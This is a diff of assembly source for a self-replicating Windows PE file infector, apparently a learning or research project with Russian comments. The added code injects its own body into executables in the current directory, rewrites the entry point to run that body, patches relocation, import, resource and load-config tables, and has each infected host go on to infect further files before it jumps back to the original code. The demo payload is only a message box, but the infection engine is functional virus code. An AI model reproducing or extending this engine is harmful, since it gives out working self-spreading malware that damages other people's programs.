@@ -161,6 +161,7 @@ HandleLoadConfTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword,
 HandleRelocs proto CurrentStdcallNotation :cword, :cword, :dword, :dword
 HandleResourceTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword, :dword
 FindTargetSection proto CurrentStdcallNotation :cword
+WriteShell proto CurrentStdcallNotation :cword, :cword
 
 DefineStdcallProto MessageBoxA, 4
 DefineStdcallProto VirtualProtect, 4
@@ -203,9 +204,11 @@ else
     jmp main
 endif
 
-isFirst db 1	; 1 - если дроп первого шеллкода, потом будет везде 0
+isFirst:
+db 1	; 1 - если дроп первого шеллкода, потом будет везде 0
+
 targetDir db ".", 0 
-originalEP dq 0
+scStruct:
 scInfo SC_PARAMS <0>
 
 
@@ -220,6 +223,7 @@ main proc
     local   oldProtect:dword
     local   pExitProcess:cword
     local   hKernelLib:cword
+    local   pOriginalEP:cword
 
     mov [pBase], cbx
 
@@ -241,9 +245,9 @@ main proc
     invoke Stdcall2 ptr [pGetProcAddress], [hKernelLib], addr [cbx + str_ExitProcess]
     mov [pExitProcess], cax
     
-    invoke FindProcArray, addr [cbx + procNames], addr [cbx + procPointers], procNamesCount
-
-    .if [cbx+isFirst]
+    .if byte ptr [cbx+isFirst] != 0
+        ;invoke64 sc_printf, 0
+        invoke FindProcArray, addr [cbx + procNames], addr [cbx + procPointers], procNamesCount
         invoke InfectFilesInCurrDir
         invoke Stdcall1 ptr [pExitProcess], 0
     .endif
@@ -252,22 +256,39 @@ main proc
 
     ; VirtualProtect (code, CODE_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect);
     invoke Stdcall4 ptr [pVirtualProtect], cbx, totalEnd - start, PAGE_EXECUTE_READWRITE, addr oldProtect
+    invoke FindProcArray, addr [cbx + procNames], addr [cbx + procPointers], procNamesCount
+
+    ; PAYLOAD
+    mov cax, cbx
+    xor ccx, ccx
+    mov ecx, dword ptr [cbx + scInfo.startRVA]
+    sub cax, ccx ; cax = IB
+    mov ecx, dword ptr [cbx + scInfo.originalEP]
+    add cax, ccx  ; cax = originalEP
+    mov [pOriginalEP], cax
+
+    invoke InfectFilesInCurrDir
+    invoke Stdcall4 ptr [pVirtualProtect], cbx, totalEnd - start, [oldProtect], NULL
+    invoke sc_MessageBoxA, NULL, addr [cbx + msgPayload], MB_OK, 0
+
+    ; прыгаем на оригинальную точку входа
+    jmp [pOriginalEP]
 
     ret
 main endp
 
 InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, codeSize:cword
 
-INJ_SIGN_OFFSET equ 079h
-INJECTION_SIGN 	equ 050h
+    INJ_SIGN_OFFSET equ 079h
+    INJECTION_SIGN 	equ 050h
 
     local peMem:cword
     local VAsc:dword
     local pSC:cword
     local pSections:cword
     local pTargetSection:cword
-    local countSec:cword
-    local i:cword
+    local countSec:dword
+    local i:dword
     ;local offsetAllData:dword
     ;local globalSCSize:dword
     local newCSSize:dword
@@ -336,8 +357,15 @@ INJECTION_SIGN 	equ 050h
     xor ccx, ccx
     mov ecx, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
     mov [cbx + scInfo.SizeOfTargetSec], ecx
-    add ccx, [codeSize]
-    mov [newCSSize], ccx
+    mov eax, [cdx].IMAGE_SECTION_HEADER.VirtualAddress
+    mov dword ptr [cbx + scInfo.targetSecRVA], eax
+    
+    ; размер шеллкода будет выравнен до страницы
+    mov [newCSSize], ecx
+    invoke AlignToTop, [codeSize], 1000h
+    mov [cbx + scInfo.alScSize], eax
+    add [newCSSize], eax
+    
     ; _diff = Aligment(vsize, _aligm) - Aligment(_psects[num].Misc.VirtualSize, _aligm);
     invoke AlignToTop, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, [secAligm]
     mov [dwTmp], eax
@@ -362,6 +390,7 @@ INJECTION_SIGN 	equ 050h
     add eax, [cdx].IMAGE_SECTION_HEADER.VirtualAddress
     mov [VAsc], eax
     mov dword ptr [cbx + scInfo.startRVA], eax
+
 
     mov eax, [cdx].IMAGE_SECTION_HEADER.PointerToRawData
     ;add eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
@@ -401,7 +430,7 @@ INJECTION_SIGN 	equ 050h
     mov ecx, [sAlignAddSize]
     add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfImage, ecx
     add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfCode, ecx
-    add [cdi].IMAGE_OPTIONAL_HEADER.BaseOfData, ecx
+    ;add [cdi].IMAGE_OPTIONAL_HEADER.BaseOfData, ecx
     ; сдвигаем все, что ниже
 
     invoke UnloadPeFile, [pe]
@@ -441,7 +470,9 @@ INJECTION_SIGN 	equ 050h
     ;add edx, [fAlignAddSize]
     ;add cdi, cdx
     mov cdi, [pSC]
-    add cdi, [fAlignAddSize]
+    xor ccx, ccx
+    mov ecx, [fAlignAddSize]
+    add cdi, ccx
     ;add cdi, [fAlignAddSize]
     
     ; src = pe.mem + targetSection->PointerToRawData + targetSection->SizeOfRawData
@@ -460,13 +491,14 @@ INJECTION_SIGN 	equ 050h
     mov [sizeMovedData], ccx
     
     invoke sc_memmove, cdi, csi, [sizeMovedData]
-    invoke sc_memset, [pSC], 041h, [fAlignAddSize]
+    invoke sc_memset, [pSC], 041h, [cbx + scInfo.alScSize]
+    
 
     ;DbgBreak
     mov ccx, [targetSection]
     mov eax, [fAlignAddSize]
     add dword ptr [ccx].IMAGE_SECTION_HEADER.SizeOfRawData, eax
-    mov eax, totalEnd - start
+    mov eax, [cbx + scInfo.alScSize]
     add dword ptr [ccx].IMAGE_SECTION_HEADER.Misc.VirtualSize, eax
 
      ; секции
@@ -475,10 +507,12 @@ INJECTION_SIGN 	equ 050h
     mov ccx, [cdi].PeHeaders.nthead
     lea ccx, [ccx].IMAGE_NT_HEADERS.OptionalHeader
     mov edx, [VAsc]
-    .if [ccx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint >= edx
+    ;.if [ccx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint >= edx
         mov edx, [fAlignAddSize]
         add [ccx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, edx 
-    .endif
+        mov edx, [ccx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
+        mov [cbx + scInfo.originalEP], edx
+    ;.endif
     xor ccx, ccx
     xor cax, cax
 
@@ -503,12 +537,16 @@ INJECTION_SIGN 	equ 050h
         mov ecx, [i]
     .endw
     
-    
-    
-    ; точка вход
-    ;add [cdx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, eax
+    ; TODO протестить
+    invoke WriteShell, [pe], 0
 
+    ; точка вход
+    mov eax, [cbx + scInfo.startRVA]
     mov cdx, [pe]
+    mov cdi, [cdx].PeHeaders.nthead
+    lea cdi, [cdi].IMAGE_NT_HEADERS.OptionalHeader
+    mov [cdi].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, eax
+    
     mov cdx, [cdx].PeHeaders.mem
     mov byte ptr [cdx + INJ_SIGN_OFFSET], INJECTION_SIGN
 
@@ -516,6 +554,46 @@ INJECTION_SIGN 	equ 050h
 
     ret
 InjectPeFile endp
+
+WriteShell proc CurrentStdcallNotation uses cbx cdi csi cdx pe:cword, is_x64:cword
+
+    local pBase:cword
+    local pSc:cword
+
+    ifdef _WIN64
+		mov [rbp + 10h], rcx
+		mov [rbp + 18h], rdx
+		mov [rbp + 20h], r8
+		mov [rbp + 28h], r9
+	endif
+
+    mov cdi, [pe]
+    mov ccx, [cdi].PeHeaders.mem
+    mov [pBase], ccx
+    
+    xor cdi, cdi
+    mov edi, [cbx + scInfo.startRVA]
+    invoke RvaToOffset, edi, [pe], NULL
+    add cax, [pBase]
+    mov [pSc], cax
+    
+    invoke sc_memcpy, [pSc], cbx, totalEnd - start
+    
+    ; обнуляем байт isFirst
+    mov cax, [pSc]
+    add cax, isFirst
+    mov byte ptr [cax], 0
+
+    ; mov cdi, [pSc]
+    ; add cdi, scStruct
+    ; add cdi, sizeof(SC_PARAMS)-sizeof(DWORD)
+    
+    ; mov eax, [cbx + scInfo.originalEP]
+    ; mov dword ptr [cdi], eax
+    ;add cdi, [pBase]
+
+    ret
+WriteShell endp
 
 FindTargetSection proc CurrentStdcallNotation uses cbx cdi csi cdx pe:cword
 
@@ -549,7 +627,7 @@ FindTargetSection proc CurrentStdcallNotation uses cbx cdi csi cdx pe:cword
     ret
 FindTargetSection endp
 
-; обработка всех таблиц (если они находятся после первой секции меняем их RVA и RVA, что в них содержатся)
+; обработка всех таблиц (меняем их RVA и RVA, что в них содержатся)
 HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dword, f_diff:dword, v_diff:dword
 
     local countSec:dword
@@ -582,11 +660,11 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
         .if [cdi].IMAGE_DATA_DIRECTORY.isize != 0
             mov csi, [pe]
             mov csi, [csi].PeHeaders.mem
-            lea ccx, [ind] 
-            invoke RvaToOffset, cax, [pe], ccx
+            ;lea ccx, [ind] 
+            mov ecx, eax
+            invoke RvaToOffset, ecx, [pe], addr [ind]
             add csi, cax        ; csi = pe.mem + VA
             .if [i] == IMAGE_DIRECTORY_ENTRY_IMPORT
-                ;DbgBreak
                 invoke HandleImportTable, [pe], csi, [scRVA], [v_diff]
             .elseif [i] ==  IMAGE_DIRECTORY_ENTRY_EXPORT
                 invoke HandleExportTable, [pe], csi, [scRVA], [v_diff]
@@ -599,7 +677,6 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
             ;    invoke HandleRelocs, [pe], csi, [scRVA], [v_diff]
             .elseif [i] == IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG
                 ;invoke AlignToTop, [scSize], [fileAligment]
-                ;DbgBreak
                 invoke HandleLoadConfTable, [pe], csi, [scRVA], [f_diff], [v_diff]
             .elseif [i] == IMAGE_DIRECTORY_ENTRY_RESOURCE
                 invoke HandleResourceTable, [pe], csi, [scRVA], [v_diff], [ind]
@@ -615,7 +692,6 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
         add cdi, IMAGE_DATA_DIRECTORY_SIZE
     .endw    
 
-    ;DbgBreak
     ; релоки в последнюю очередь 
     mov cax, [pe]       
     mov cax, [cax].PeHeaders.nthead
@@ -661,12 +737,12 @@ HandleResourceTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pDirA
 		mov [rbp + 28h], r9
 	endif
 
-    ;DbgBreak
+    
     mov cdi, [pe]
     mov cax, [cdi].PeHeaders.mem
     mov [pMem], cax
     mov cdi, [cdi].PeHeaders.sections
-    mov cax, [secInd]
+    mov eax, [secInd]
     imul cax, IMAGE_SIZEOF_SECTION_HEADER
     add cdi, cax
     mov [pSection], cdi
@@ -711,13 +787,14 @@ HandleResourceTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pDirA
             mov eax, [csi+4]
             and eax, 07fffffffh
             add edx, eax
-            lea ccx, [lInd]
-            invoke RvaToOffset, edx, [pe], ccx
+            ;lea ccx, [lInd]
+            invoke RvaToOffset, edx, [pe], addr [lInd]
             add cax, [pMem]
             invoke HandleResourceTable, [pe], cax, [scRVA], [allignScSize], [lInd]
         .else
             mov cax, [pSectionMem]
-            add cax, dword ptr [csi+4] ; pedir[i].OffsetToData
+            mov ecx, dword ptr [csi+4] ; pedir[i].OffsetToData
+            add cax, ccx
             mov [pIRDataE], cax
             mov edx, [scRVA]
             .if dword ptr [cax].IMAGE_RESOURCE_DATA_ENTRY.OffsetToData >= edx
@@ -747,7 +824,6 @@ HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT
 		mov [rbp + 28h], r9
 	endif
 
-    ;DbgBreak
     mov cdi, [pe]
     mov ccx, [cdi].PeHeaders.nthead
     lea ccx, [ccx].IMAGE_NT_HEADERS.OptionalHeader
@@ -761,7 +837,7 @@ HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT
     .if [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerTable != 0
         mov ccx, [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerTable
         sub ccx, [ib]
-        invoke RvaToOffset, ccx, [pe], NULL
+        invoke RvaToOffset, ecx, [pe], NULL
         .if cax == 0
             ret
         .endif
@@ -809,7 +885,7 @@ HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, 
 
     mov csi, [csi].PeHeaders.mem
     mov [pBase], csi
-    ;DbgBreak
+
     mov cdi, [pIRT]
     .while !([cdi].IMAGE_BASE_RELOCATION.VirtualAddress == NULL && \
              [cdi].IMAGE_BASE_RELOCATION.SizeOfBlock == NULL)
@@ -821,6 +897,7 @@ HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, 
         xor cdx, cdx
         mov ccx, [pBlocks]
         .while word ptr [ccx] != 0
+            mov [pBlocks], ccx
             invoke RvaToOffset, [cdi].IMAGE_BASE_RELOCATION.VirtualAddress, [pe], NULL
             mov csi, [pBase]
             add csi, cax    ; pe->mem + VA
@@ -833,19 +910,40 @@ HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, 
             .if cword ptr [csi] >= cdx
                 xor cax, cax
                 ;mov cdx, cax
-                ;.if [cdi].IMAGE_BASE_RELOCATION.VirtualAddress >
-                mov edx, dword ptr [cbx + scInfo.v_diff]
+                
+                mov edx, dword ptr [cbx + scInfo.SizeOfTargetSec]
+                ;invoke AlignToTop, cdx, [pe]
+                add cdx, [ib]
+                mov ecx, [cbx + scInfo.targetSecRVA]
+                add cdx, ccx
+                .if cword ptr [csi] < cdx
+                    mov ecx, dword ptr [cbx + scInfo.f_diff]
+                    mov cdx, ccx
+                .else
+                    mov ecx, dword ptr [cbx + scInfo.v_diff]
+                    mov cdx, ccx
+                .endif
                 add cword ptr [csi], cdx
             .endif
+            ; DbgBreak
+            ; mov edx, dword ptr [cbx + scInfo.SizeOfTargetSec]
+            ; add edx, [cbx + scInfo.targetSecRVA]
+            ; .if dword ptr [cdi].IMAGE_BASE_RELOCATION.VirtualAddress < edx
+            ;     mov edx, dword ptr [cbx + scInfo.f_diff]
+            ;     and edx, 0fffh
+            ;     add word ptr [ccx], dx
+            ; .endif
+            mov ccx, [pBlocks]
             add ccx, 2
         .endw
 
-        mov edx, [scRVA]
-        mov ecx, [allignScSize]
+        mov edx, [cbx + scInfo.startRVA]
+        mov ecx, [cbx + scInfo.v_diff]
         .if [cdi].IMAGE_BASE_RELOCATION.VirtualAddress >= edx
             add dword ptr [cdi].IMAGE_BASE_RELOCATION.VirtualAddress, ecx
         .endif
-        add cdi, [cdi].IMAGE_BASE_RELOCATION.SizeOfBlock
+        mov ecx, [cdi].IMAGE_BASE_RELOCATION.SizeOfBlock
+        add cdi, ccx
         
     .endw
 
@@ -942,7 +1040,7 @@ HandleImportTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIDT:cw
             mov esi, [cdi].IMAGE_IMPORT_DESCRIPTOR.FirstThunk
         .endif
         xor cax, cax
-        invoke RvaToOffset, csi, [pe], NULL
+        invoke RvaToOffset, esi, [pe], NULL
         mov csi, [pe]
         mov cdx, [csi].PeHeaders.mem
         add cax, cdx    ; csi = iat
@@ -952,7 +1050,8 @@ HandleImportTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIDT:cw
         .while cword ptr [csi] != NULL
             xor cdx, cdx
             mov edx, [scRVA]
-            .if !(cword ptr [csi] & IMAGE_ORDINAL_FLAG) && \
+            mov ccx, IMAGE_ORDINAL_FLAG
+            .if !(cword ptr [csi] & ccx) && \
                 (cword ptr [csi] >= cdx)
 
                 mov edx, [scSize]
@@ -1155,6 +1254,8 @@ msgWarningFilesNotFound:
 db "Warning: Exe files for infection not found", 10, 0
 msgWarningFileWithoutRelocs:
 db "Warning: File without relocs", 10, 0
+msgPayload:
+db "Hello from PAYLOAD!!!", 10, 0
 
 DefineFuncNamesAndPointers VirtualProtect, MessageBoxA, GetModuleHandleA, WriteProcessMemory, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, CreateFileA, GetFileSize, CreateFileMappingA, CloseHandle,  MapViewOfFile, UnmapViewOfFile, GetLastError, GetTickCount, Sleep, printf, memset, strlen, memcpy, malloc, strcmp, sprintf, strcpy, strcat, memmove,
 
